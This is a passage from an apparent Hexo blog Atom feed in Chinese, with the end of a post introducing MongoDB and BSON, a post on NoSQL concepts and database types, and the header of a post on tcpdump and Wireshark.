{&#x201C;FirstName&#x201D;:&#x201D;ke&#x201D;,&#x201D;LastName&#x201D;:&#x201D;me&#x201D;,&#x201D;email&#x201D;:&#x201D;hikeme@aa&#x201D;}<br>&#x53D6;&#x503C;&#x65B9;&#x5F0F;&#x548C;&#x6240;&#x6709;&#x8BED;&#x8A00;&#x4E2D;&#x4E00;&#x6837;,&#x4F7F;&#x7528; key &#x83B7;&#x53D6;,&#x5B57;&#x6BB5;&#x503C;&#x7684;&#x7C7B;&#x578B;&#x53EF;&#x4EE5;&#x662F; &#x6570;&#x5B57;&#x3001;&#x5B57;&#x7B26;&#x4E32;&#x3001;&#x6570;&#x7EC4;&#x3001;&#x5BF9;&#x8C61;&#x51E0;&#x79CD;&#x3002;</p><h3 id="2-1-2-BSON"><a href="#2-1-2-BSON" class="headerlink" title="2.1.2 BSON"></a>2.1.2 BSON</h3><p>BSON &#x662F;&#x4E00;&#x79CD;&#x7C7B; JSON &#x7684;&#x4E00;&#x79CD;&#x4E8C;&#x8FDB;&#x5236;&#x5F62;&#x5F0F;&#x7684;&#x5B58;&#x50A8;&#x683C;&#x5F0F;&#xFF0C;&#x7B80;&#x79F0; Binary JSON&#xFF0C;&#x5B83;&#x548C; JSON &#x4E00;&#x6837;&#xFF0C;&#x652F;&#x6301;&#x5185;&#x5D4C;&#x7684;&#x6587;&#x6863;&#x5BF9;&#x8C61;&#x548C;&#x6570;&#x7EC4;&#x5BF9;&#x8C61;&#xFF0C;&#x4F46;&#x662F; BSON &#x6709; JSON &#x6CA1;&#x6709;&#x7684;&#x4E00;&#x4E9B;&#x6570;&#x636E;&#x7C7B;&#x578B;&#xFF0C;&#x5982; Date &#x548C; BinData &#x7C7B;&#x578B;&#x3002;  </p><p>&#x5B83;&#x7684;&#x4F18;&#x70B9;&#x662F;&#x7075;&#x6D3B;&#x6027;&#x9AD8;&#xFF0C;&#x4F46;&#x5B83;&#x7684;&#x7F3A;&#x70B9;&#x662F;&#x7A7A;&#x95F4;&#x5229;&#x7528;&#x7387;&#x4E0D;&#x662F;&#x5F88;&#x7406;&#x60F3;&#x3002;<br>BSON &#x6709;&#x4E09;&#x4E2A;&#x7279;&#x70B9;&#xFF1A;&#x8F7B;&#x91CF;&#x6027;&#x3001;&#x53EF;&#x904D;&#x5386;&#x6027;&#x3001;&#x9AD8;&#x6548;&#x6027;&#x3002;<br>&#x5BF9;JSON &#x6765;&#x8BF4;&#xFF0C;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x662F;&#x65E0;&#x7C7B;&#x578B;&#x7684;&#xFF0C;&#x6BD4;&#x5982;&#x4F60;&#x8981;&#x4FEE;&#x6539;&#x57FA;&#x672C;&#x4E00;&#x4E2A;&#x503C;&#xFF0C;&#x4ECE; 9 &#x5230; 10&#xFF0C;&#x7531;&#x4E8E;&#x4ECE;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x53D8;&#x6210;&#x4E86;&#x4E24;&#x4E2A;&#xFF0C;&#x6240;&#x4EE5;&#x53EF;&#x80FD;&#x5176;&#x540E;&#x9762;&#x7684;&#x6240;&#x6709;&#x5185;&#x5BB9;&#x90FD;&#x9700;&#x8981;&#x5F80;&#x540E;&#x79FB;&#x4E00;&#x4F4D;&#x624D;&#x53EF;&#x4EE5;&#x3002;&#x800C;&#x4F7F;&#x7528; BSON&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x8FD9;&#x4E2A;&#x5217;&#x4E3A;&#x6570;&#x5B57;&#x5217;&#xFF0C;&#x90A3;&#x4E48;&#x65E0;&#x8BBA;&#x6570;&#x5B57;&#x4ECE; 9 &#x957F;&#x5230; 10 &#x8FD8;&#x662F; 100&#xFF0C;&#x6211;&#x4EEC;&#x90FD;&#x53EA;&#x662F;&#x5728;&#x5B58;&#x50A8;&#x6570;&#x5B57;&#x7684;&#x90A3;&#x4E00;&#x4F4D;&#x4E0A;&#x8FDB;&#x884C;&#x4FEE;&#x6539;&#xFF0C;&#x4E0D;&#x4F1A;&#x5BFC;&#x81F4;&#x6570;&#x636E;&#x603B;&#x957F;&#x53D8;&#x5927;&#x3002;&#x5F53;&#x7136;&#xFF0C;&#x5728; MongoDB &#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x6570;&#x5B57;&#x4ECE;&#x6574;&#x5F62;&#x589E;&#x5927;&#x5230;&#x957F;&#x6574;&#x578B;&#xFF0C;&#x8FD8;&#x662F;&#x4F1A;&#x5BFC;&#x81F4;&#x6570;&#x636E;&#x603B;&#x957F;&#x53D8;&#x5927;&#x7684;&#x3002;</p><p>&#x6709;&#x65F6; BSON &#x76F8;&#x5BF9; JSON &#x6765;&#x8BF4;&#x4E5F;&#x5E76;&#x6CA1;&#x6709;&#x7A7A;&#x95F4;&#x4E0A;&#x7684;&#x4F18;&#x52BF;&#xFF0C;&#x6BD4;&#x5982;&#x5BF9;{&#x201C;sex&#x201D;:1}&#xFF0C;&#x5728; JSON &#x7684;&#x5B58;&#x50A8;&#x4E0A;,&#x2019;1&#x2019;&#x53EA;&#x4F7F;&#x7528;&#x4E86;&#x4E00;&#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x800C;&#x5982;&#x679C;&#x7528; BSON&#xFF0C;&#x90A3;&#x5C31;&#x662F;&#x81F3;&#x5C11; 4 &#x4E2A;&#x5B57;&#x8282;</p><h2 id="2-2-MongoDB-&#x7279;&#x70B9;"><a href="#2-2-MongoDB-&#x7279;&#x70B9;" class="headerlink" title="2.2 MongoDB &#x7279;&#x70B9;"></a>2.2 MongoDB &#x7279;&#x70B9;</h2><p><strong>&#x9AD8;&#x6027;&#x80FD;&#xFF1A;</strong> Mongodb &#x63D0;&#x4F9B;&#x9AD8;&#x6027;&#x80FD;&#x7684;&#x6570;&#x636E;&#x6301;&#x4E45;&#x6027;&#xFF0C;&#x5C24;&#x5176;&#x662F;&#x652F;&#x6301;&#x5D4C;&#x5165;&#x5F0F;&#x6570;&#x636E;&#x6A21;&#x578B;&#x51CF;&#x5C11;&#x6570;&#x636E;&#x5E93;&#x7CFB;&#x7EDF;&#x4E0A;&#x7684;I/O &#x64CD;&#x4F5C;&#xFF0C;&#x7D22;&#x5F15;&#x652F;&#x6301;&#x80FD;&#x5FEB;&#x7684;&#x67E5;&#x8BE2;&#xFF0C;&#x5E76;&#x4E14;&#x53EF;&#x4EE5;&#x5305;&#x62EC;&#x6765;&#x5D4C;&#x5165;&#x5F0F;&#x6587;&#x6863;&#x548C;&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x952E;</p><p><strong>&#x4E30;&#x5BCC;&#x7684;&#x8BED;&#x8A00;&#x67E5;&#x8BE2;&#xFF1A;</strong> Mongodb &#x652F;&#x6301;&#x4E30;&#x5BCC;&#x7684;&#x67E5;&#x8BE2;&#x8BED;&#x8A00;&#x6765;&#x652F;&#x6301;&#x8BFB;&#x5199;&#x64CD;&#x4F5C;&#xFF08;CRUD&#xFF09;&#x4EE5;&#x53CA;&#x6570;&#x636E;&#x6C47;&#x603B;&#xFF0C;&#x6587;&#x672C;&#x641C;&#x7D22;&#x548C;&#x5730;&#x7406;&#x7A7A;&#x95F4;&#x7D22;&#x5F15;</p><p><strong>&#x9AD8;&#x53EF;&#x7528;&#x6027;&#xFF1A;</strong> Mongodb &#x7684;&#x590D;&#x5236;&#x5DE5;&#x5177;&#xFF0C;&#x6210;&#x4E3A;&#x526F;&#x672C;&#x96C6;&#xFF0C;&#x63D0;&#x4F9B;&#x81EA;&#x52A8;&#x6545;&#x969C;&#x8F6C;&#x79FB;&#x548C;&#x6570;&#x636E;&#x5197;&#x4F59;&#xFF0C;&#x6C34;&#x5E73;&#x53EF;&#x6269;&#x5C55;&#x6027;&#xFF1A; Mongodb &#x63D0;&#x4F9B;&#x4E86;</p><p><strong>&#x53EF;&#x6269;&#x5C55;&#x6027;</strong>&#xFF0C;&#x4F5C;&#x4E3A;&#x5176;&#x6838;&#x5FC3;&#x529F;&#x80FD;&#x7684;&#x4E00;&#x90E8;&#x5206;&#xFF0C;&#x5206;&#x7247;&#x662F;&#x5C06;&#x6570;&#x636E;&#x5206;&#xFF0C;&#x5728;&#x4E00;&#x7EC4;&#x8BA1;&#x7B97;&#x673A;&#x4E0A;&#x3002;</p><p><strong>&#x652F;&#x6301;&#x591A;&#x79CD;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#xFF1A;</strong> WiredTiger &#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x548C;&#x3001; MMAPv1 &#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x548C; InMemory &#x5B58;&#x50A8;&#x5F15;&#x64CE;</p><h2 id="2-3-MongoDB-&#x5305;&#x542B;&#x7684;&#x7A0B;&#x5E8F;"><a href="#2-3-MongoDB-&#x5305;&#x542B;&#x7684;&#x7A0B;&#x5E8F;" class="headerlink" title="2.3 MongoDB &#x5305;&#x542B;&#x7684;&#x7A0B;&#x5E8F;"></a>2.3 MongoDB &#x5305;&#x542B;&#x7684;&#x7A0B;&#x5E8F;</h2><p><code>MongoDB Drivers</code><br>&#x5B98;&#x65B9; MongoDB &#x5BA2;&#x6237;&#x7AEF;&#x5E93;&#x63D0;&#x4F9B; C&#xFF0C; C ++&#xFF0C; C&#xFF03;&#xFF0C; Java&#xFF0C; Node.JS&#xFF0C; Perl&#xFF0C; PHP&#xFF0C;Python&#xFF0C; Ruby&#x548C;Scala &#x9A71;&#x52A8;&#x7A0B;&#x5E8F;&#x7684;&#x53C2;&#x8003;&#x6307;&#x5357;&#x3002;</p><p><code>MongoDB Stitch</code><br>&#x4E3A;&#x5F00;&#x53D1;&#x4EBA;&#x5458;&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x4E2A; API &#x5230; MongoDB &#x548C;&#x5176;&#x4ED6;&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x3002;&#x4FDD;&#x6301; MongoDB &#x7684;&#x5168;&#x90E8;&#x529F;&#x80FD;&#x548C;&#x7075;&#x6027;&#xFF0C;&#x540C;&#x65F6;&#x53D7;&#x76CA;&#x4E8E;&#x5F3A;&#x5927;&#x7684;&#x7CFB;&#x7EDF;&#x6765;&#x914D;&#x7F6E;&#x7EC6;&#x7C92;&#x5EA6;&#x7684;&#x6570;&#x636E;&#x8BBF;&#x95EE;&#x63A7;&#x5236;&#x3002;</p><p><code>MongoDB Atlas</code><br>MongoDB &#x5728;&#x4E91;&#x4E2D;&#x90E8;&#x7F72;&#xFF0C;&#x64CD;&#x4F5C;&#x548C;&#x6269;&#x5C55;&#x7684;&#x6700;&#x4F73;&#x65B9;&#x5F0F;&#x3002;&#x9002;&#x7528;&#x4E8E; AWS&#xFF0C;Azure &#x548C; Google Cloud Platform&#x3002;&#x8F7B;&#x677E;&#x5C06;&#x6570;&#x636E;&#x8FC1;&#x79FB;&#x5230; MongoDB Atlas&#xFF0C;&#x96F6;&#x505C;&#x673A;</p><p><code>MongoDB Cloud Manager</code><br>&#x662F;&#x4E00;&#x4E2A;&#x7528;&#x4E8E;&#x7BA1;&#x7406; MongoDB &#x90E8;&#x7F72;&#x7684;&#x8F6F;&#x4EF6;&#x5305;&#x3002; Ops Manager &#x63D0;&#x4F9B; Ops Manager &#x76D1;&#x63A7;&#x548C; Ops Manager &#x5907;&#x4EFD;&#xFF0C;&#x53EF;&#x5E2E;&#x52A9;&#x7528;&#x6237;&#x4F18;&#x5316;&#x7FA4;&#x96C6;&#x5E76;&#x964D;&#x4F4E;&#x64CD;&#x4F5C;&#x98CE;&#x9669;</p><p><code>MongoDB Charts</code><br>&#x53EF;&#x4EE5;&#x6700;&#x5FEB;&#x901F;&#x6700;&#x7B80;&#x5355;&#x7684;&#x521B;&#x5EFA; Mongodb &#x53EF;&#x89C6;&#x5316;&#x56FE;&#x8868;</p><p><code>MongoDB Connector for BI</code><br>MongoDB &#x5546;&#x4E1A;&#x667A;&#x80FD;&#x8FDE;&#x63A5;&#x5668;&#xFF08;BI&#xFF09;&#x5141;&#x8BB8;&#x7528;&#x6237;&#x4F7F;&#x7528; SQL &#x521B;&#x5EFA;&#x67E5;&#x8BE2;&#xFF0C;&#x5E76;&#x4F7F;&#x7528;&#x73B0;&#x6709;&#x7684;&#x5173;&#x7CFB;&#x5546;&#x4E1A;&#x667A;&#x80FD;&#x5DE5;&#x5177;&#xFF08;&#x5982; Tableau&#xFF0C; MicroStrategy &#x548C; Qlik&#xFF09;&#x5BF9;&#x5176; MongoDB Enterprise &#x6570;&#x636E;&#x8FDB;&#x884C;&#x53EF;&#x89C6;&#x5316;&#xFF0C;&#x56FE;&#x5F62;&#x5316;&#x548C;&#x62A5;&#x544A;&#x3002;</p><p><code>MongoDB Compass</code><br>&#x901A;&#x8FC7;&#x4ECE;&#x96C6;&#x5408;&#x4E2D;&#x968F;&#x673A;&#x62BD;&#x6837;&#x4E00;&#x4E2A;&#x6587;&#x6863;&#x5B50;&#x96C6;&#xFF0C;&#x4E3A;&#x7528;&#x6237;&#x63D0;&#x4F9B;&#x5176; MongoDB &#x6A21;&#x5F0F;&#x7684;&#x56FE;&#x5F62;&#x89C6;&#x56FE;&#x3002;&#x91C7;&#x6837;&#x6587;&#x4EF6;&#x53EF;&#x6700;&#x5927;&#x7A0B;&#x5EA6;&#x5730;&#x964D;&#x4F4E;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5F71;&#x54CD;&#xFF0C;&#x5E76;&#x80FD;&#x5FEB;&#x901F;&#x4EA7;&#x751F;&#x7ED3;&#x679C;&#x3002;&#x6709;&#x5173; &#x62BD;&#x6837;&#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;</p><p><code>MongoDB Spark Connector</code><br>&#x4F7F;&#x7528;&#x8FDE;&#x63A5;&#x5668;&#xFF0C;&#x60A8;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#x6240;&#x6709;&#x4F7F;&#x7528; MongoDB &#x6570;&#x636E;&#x96C6;&#x7684; Spark &#x5E93;&#xFF1A;&#x7528; SQL &#x8FDB;&#x884C;&#x5206;&#x6790;&#x7684;&#x6570;&#x636E;&#x96C6;&#xFF08;&#x53D7;&#x76CA;&#x4E8E;&#x81EA;&#x52A8;&#x6A21;&#x5F0F;&#x63A8;&#x7406;&#xFF09;&#xFF0C;&#x6D41;&#x5F0F;&#x4F20;&#x8F93;&#xFF0C;&#x673A;&#x5668;&#x5B66;&#x4E60;&#x548C;&#x56FE;&#x5F62; API&#x3002;&#x60A8;&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x8FDE;&#x63A5;&#x5668;&#x4E0E; Spark Shell&#x3002;</p><h2 id="&#x5E94;&#x7528;&#x573A;&#x666F;"><a href="#&#x5E94;&#x7528;&#x573A;&#x666F;" class="headerlink" title="&#x5E94;&#x7528;&#x573A;&#x666F;"></a>&#x5E94;&#x7528;&#x573A;&#x666F;</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MongoDB&amp;#x4ECB;&amp;#x7ECD;&quot;&gt;&lt;a href=&quot;#MongoDB&amp;#x4ECB;&amp;#x7ECD;&quot; class=&quot;headerlink&quot; title=&quot;MongoDB&amp;#x4ECB;&amp;#x7ECD;&quot;&gt;&lt;/a&gt;MongoDB&amp;#x4ECB;&amp;#
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>NoSQL知识</title>
    <link href="https://marnm.github.io//posts/36ba38f9/"/>
    <id>https://marnm.github.io//posts/36ba38f9/</id>
    <published>2022-06-07T04:42:29.000Z</published>
    <updated>2022-06-07T05:18:04.086Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NoSQL"><a href="#NoSQL" class="headerlink" title="NoSQL"></a>NoSQL</h1><p>NoSQL&#xFF08;Not Only SQL&#xFF09;&#xFF0C;&#x610F;&#x5373;&#x201D;&#x4E0D;&#x4EC5;&#x4EC5;&#x662F; SQL&#x201D;&#x3002;</p><p>NoSQL&#x6700;&#x5E38;&#x89C1;&#x7684;&#x89E3;&#x91CA;&#x662F;<code>non-relational</code>&#xFF0C;<code>Not Only SQL</code>&#x4E5F;&#x88AB;&#x5F88;&#x591A;&#x4EBA;&#x63A5;&#x53D7;&#x3002;NoSQL&#x4EC5;&#x4EC5;&#x662F;&#x4E00;&#x4E2A;&#x6982;&#x5FF5;&#xFF0C;&#x6CDB;&#x6307;&#x975E;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x533A;&#x522B;&#x4E0E;&#x5173;&#x7CFB;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x5B83;&#x4EEC;&#x4E0D;&#x4FDD;&#x8BC1;&#x5173;&#x7CFB;&#x6570;&#x636E;&#x7684;ACID&#x7279;&#x6027;&#x3002;&#x8981;&#x89E3;&#x7B54;&#x7B2C;&#x4E00;&#x70B9;&#x7591;&#x95EE;&#xFF0C;&#x9996;&#x5148;&#x8981;&#x660E;&#x767D;NoSQL&#x662F;&#x4E3A;&#x4E86;&#x89E3;&#x51B3;&#x4EC0;&#x4E48;&#x51FA;&#x73B0;&#x7684;&#xFF0C;&#x5B9E;&#x9645;&#x4E0A;NoSQL&#x662F;&#x968F;&#x7740;&#x5927;&#x6570;&#x636E;&#x65F6;&#x4EE3;&#x9700;&#x6C42;&#x63D0;&#x51FA;&#x6240;&#x9010;&#x6E10;&#x53D1;&#x5C55;&#x7684;&#xFF0C;&#x9488;&#x5BF9;&#x6D77;&#x91CF;&#x7684;&#x6570;&#x636E;&#x751A;&#x81F3;&#x662F;&#x975E;&#x7ED3;&#x6784;&#x5316;&#x6570;&#x636E;&#x8981;&#x5B9E;&#x73B0;<strong>&#x9AD8;&#x5E76;&#x53D1;</strong>&#xFF0C;<strong>&#x9AD8;&#x53EF;&#x6269;</strong>&#xFF0C;&#x4EE5;&#x53CA;<strong>&#x9AD8;&#x6027;&#x80FD;</strong>&#x7684;&#x7279;&#x70B9;&#x3002;</p><p><strong>1.</strong> &#x9996;&#x5148;&#x662F;&#x9AD8;&#x5E76;&#x53D1;&#xFF0C;&#x5927;&#x591A;&#x6570;&#x65F6;&#x5019;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;NoSQL&#x505A;&#x7F13;&#x51B2;&#x64CD;&#x4F5C;&#xFF0C;&#x8BA9;&#x8BF7;&#x6C42;&#x8BBF;&#x95EE;&#x5230;NoSQL&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x3002;&#x63D0;&#x4F9B;&#x4E86;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x4E3B;&#x4ECE;&#x5206;&#x7C7B;&#x5BF9;&#x9AD8;&#x5E76;&#x53D1;&#x4E4B;&#x5916;&#x7684;&#x5176;&#x5B83;&#x5E76;&#x53D1;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x3002;<br><strong>2.</strong> &#x7B2C;&#x4E8C;&#x70B9;&#x5C31;&#x662F;&#x9AD8;&#x53EF;&#x6269;&#xFF0C;NoSQL&#x65E0;&#x9700;&#x4E8B;&#x5148;&#x4E3A;&#x8981;&#x5B58;&#x50A8;&#x7684;&#x6570;&#x636E;&#x5EFA;&#x7ACB;&#x5B57;&#x6BB5;&#xFF0C;&#x968F;&#x65F6;&#x53EF;&#x4EE5;&#x5B58;&#x50A8;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x6570;&#x636E;&#x683C;&#x5F0F;&#x3002;NoSQL&#x6570;&#x636E;&#x5E93;&#x79CD;&#x7C7B;&#x7E41;&#x591A;&#xFF0C;&#x4F46;&#x662F;&#x4E00;&#x4E2A;&#x5171;&#x540C;&#x70B9;&#x90FD;&#x662F;&#x53BB;&#x6389;&#x5173;&#x7CFB;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5173;&#x7CFB;&#x578B;&#x7279;&#x6027;&#x3002;&#x6570;&#x636E;&#x4E4B;&#x95F4;&#x65E0;&#x5173;&#x7CFB;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x975E;&#x5E38;&#x5BB9;&#x6613;&#x6269;&#x5C55;&#x3002;&#x4E5F;&#x65E0;&#x5F62;&#x4E4B;&#x95F4;&#xFF0C;&#x5728;&#x67B6;&#x6784;&#x7684;&#x5C42;&#x9762;&#x4E0A;&#x5E26;&#x6765;&#x4E86;&#x53EF;&#x6269;&#x5C55;&#x7684;&#x80FD;&#x529B;&#x3002;<br><strong>3.</strong> &#x6700;&#x540E;&#x4E00;&#x70B9;&#x662F;&#x9AD8;&#x6027;&#x80FD;&#xFF0C;&#x8FD9;&#x4E00;&#x70B9;&#x8DDF;&#x7B2C;&#x4E00;&#x70B9;&#x9AD8;&#x5E76;&#x53D1;&#x606F;&#x606F;&#x76F8;&#x5173;&#x7684;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x7531;&#x4E8E;NoSQL&#x6570;&#x636E;&#x5E93;&#x90FD;&#x5177;&#x6709;&#x975E;&#x5E38;&#x9AD8;&#x7684;&#x8BFB;&#x5199;&#x6027;&#x80FD;&#xFF0C;&#x5C24;&#x5176;&#x5728;&#x5927;&#x6570;&#x636E;&#x91CF;&#x4E0B;&#xFF0C;&#x540C;&#x6837;&#x8868;&#x73B0;&#x4F18;&#x79C0;&#x3002;&#x8FD9;&#x5F97;&#x76CA;&#x4E8E;&#x5B83;&#x7684;&#x65E0;&#x5173;&#x7CFB;&#x6027;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x7684;&#x7ED3;&#x6784;&#x7B80;&#x5355;&#x3002;</p><h1 id="&#x4E3A;&#x4EC0;&#x4E48;&#x4F7F;&#x7528;NoSQL"><a href="#&#x4E3A;&#x4EC0;&#x4E48;&#x4F7F;&#x7528;NoSQL" class="headerlink" title="&#x4E3A;&#x4EC0;&#x4E48;&#x4F7F;&#x7528;NoSQL"></a>&#x4E3A;&#x4EC0;&#x4E48;&#x4F7F;&#x7528;NoSQL</h1><table><thead><tr><th>&#x9700;&#x6C42;</th><th>NoSQL&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;</th></tr></thead><tbody><tr><td>&#x9AD8;&#x5E76;&#x53D1;</td><td>&#x4F7F;&#x7528;NoSQL&#x505A;&#x7F13;&#x51B2;&#x64CD;&#x4F5C;&#xFF0C;&#x8BA9;&#x8BF7;&#x6C42;&#x5148;&#x8BBF;&#x95EE;&#x5230;NoSQL&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x3002;</td></tr><tr><td>&#x9AD8;&#x53EF;&#x6269;</td><td>NoSQL&#x65E0;&#x9700;&#x4E8B;&#x5148;&#x4E3A;&#x8981;&#x5B58;&#x50A8;&#x7684;&#x6570;&#x636E;&#x5EFA;&#x7ACB;&#x5B57;&#x6BB5;&#xFF0C;&#x968F;&#x65F6;&#x53EF;&#x4EE5;&#x5B58;&#x50A8;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x6570;&#x636E;&#x683C;&#x5F0F;</td></tr><tr><td>&#x9AD8;&#x6027;&#x80FD;</td><td>NoSQL&#x6570;&#x636E;&#x5E93;&#x90FD;&#x5177;&#x6709;&#x975E;&#x5E38;&#x9AD8;&#x7684;&#x8BFB;&#x5199;&#x6027;&#x80FD;&#xFF0C;&#x5C24;&#x5176;&#x5728;&#x5927;&#x6570;&#x636E;&#x91CF;&#x4E0B;&#xFF0C;&#x540C;&#x6837;&#x8868;&#x73B0;&#x4F18;&#x79C0;&#x3002;&#x8FD9;&#x5F97;&#x76CA;&#x4E8E;&#x5B83;&#x7684;&#x65E0;&#x5173;&#x7CFB;&#x6027;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x7684;&#x7ED3;&#x6784;&#x7B80;&#x5355;</td></tr></tbody></table><h1 id="&#x5404;&#x79CD;&#x7C7B;&#x578B;&#x7684;NoSQL&#x6BD4;&#x8F83;"><a href="#&#x5404;&#x79CD;&#x7C7B;&#x578B;&#x7684;NoSQL&#x6BD4;&#x8F83;" class="headerlink" title="&#x5404;&#x79CD;&#x7C7B;&#x578B;&#x7684;NoSQL&#x6BD4;&#x8F83;"></a>&#x5404;&#x79CD;&#x7C7B;&#x578B;&#x7684;NoSQL&#x6BD4;&#x8F83;</h1><table><thead><tr><th>&#x5206;&#x7C7B;</th><th>&#x4E3E;&#x4F8B;</th><th>&#x5E94;&#x7528;&#x573A;&#x666F;/&#x7279;&#x6027;</th></tr></thead><tbody><tr><td>KV&#x578B;NoSQL</td><td>Redis&#xFF0C;memcachedDB</td><td>&#x7528;&#x4E8E;&#x5185;&#x5BB9;&#x7F13;&#x5B58;&#x7B49;&#xFF0C;&#x6570;&#x636E;&#x57FA;&#x4E8E;&#x5185;&#x5B58;&#xFF0C;&#x8BFB;&#x5199;&#x6548;&#x7387;&#x9AD8;&#xFF0C;KV&#x578B;&#x6570;&#x636E;&#xFF0C;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x4E3A;O(1)&#xFF0C;&#x67E5;&#x8BE2;&#x901F;&#x5EA6;&#x5FEB;</td></tr><tr><td>&#x5217;&#x5F0F;NoSQL</td><td>HBase&#xFF0C;Cassandra</td><td>&#x5217;&#x5F0F;NoSql&#x548C;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x4E00;&#x6837;&#x90FD;&#x6709;&#x4E3B;&#x952E;&#x7684;&#x6982;&#x5FF5;&#xFF0C;&#x533A;&#x522B;&#x5728;&#x4E8E;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x662F;&#x6309;&#x7167;&#x884C;&#x7EC4;&#x7EC7;&#x7684;&#x6570;&#x636E;, HBase&#x6BD4;&#x8F83;&#x9002;&#x7528;&#x4E8E;&#x90A3;&#x79CD;KV&#x578B;&#x7684;&#x4E14;&#x672A;&#x6765;&#x65E0;&#x6CD5;&#x9884;&#x4F30;&#x6570;&#x636E;&#x589E;&#x957F;&#x91CF;&#x7684;&#x573A;&#x666F;</td></tr><tr><td>&#x6587;&#x6863;&#x578B;NoSQL</td><td>CouchDB,MongoDB</td><td>MongDB&#x7684;&#x4F7F;&#x7528;&#x573A;&#x666F;&#x5F88;&#x5927;&#x7A0B;&#x5EA6;&#x4E0A;&#x53EF;&#x4EE5;&#x5BF9;&#x6807;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x4F46;&#x662F;&#x6BD4;&#x8F83;&#x9002;&#x5408;&#x5904;&#x7406;&#x90A3;&#x4E9B;&#x6CA1;&#x6709;join&#x3001;&#x6CA1;&#x6709;&#x5F3A;&#x4E00;&#x81F4;&#x6027;&#x8981;&#x6C42;&#x4E14;&#x8868;&#x7ED3;&#x6784;&#x4F1A;&#x5E38;&#x53D8;&#x5316;&#x7684;&#x6570;&#x636E;&#x3002;</td></tr><tr><td>&#x641C;&#x7D22;&#x578B;NoSQL</td><td>Elasticsearch</td><td>&#x641C;&#x7D22;&#x578B;NoSql&#x6700;&#x9002;&#x7528;&#x7684;&#x573A;&#x666F;&#x5C31;&#x662F;&#x6709;&#x6761;&#x4EF6;&#x641C;&#x7D22;&#x5C24;&#x5176;&#x662F;&#x5168;&#x6587;&#x641C;&#x7D22;&#x7684;&#x573A;&#x666F;&#xFF0C;&#x4F5C;&#x4E3A;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4E00;&#x79CD;&#x66FF;&#x4EE3;&#x65B9;&#x6848;&#x3002;</td></tr></tbody></table><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;NoSQL&quot;&gt;&lt;a href=&quot;#NoSQL&quot; class=&quot;headerlink&quot; title=&quot;NoSQL&quot;&gt;&lt;/a&gt;NoSQL&lt;/h1&gt;&lt;p&gt;NoSQL&amp;#xFF08;Not Only SQL&amp;#xFF09;&amp;#xFF0C;&amp;#x610F;&amp;#x5373;&amp;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>tcpdump与Wireshark的使用</title>
    <link href="https://marnm.github.io//posts/6efb91e0/"/>
    <id>https://marnm.github.io//posts/6efb91e0/</id>
    <published>2022-06-07T04:42:00.000Z</published>
    <updated>2022-06-07T05:18:30.267Z</updated>
    
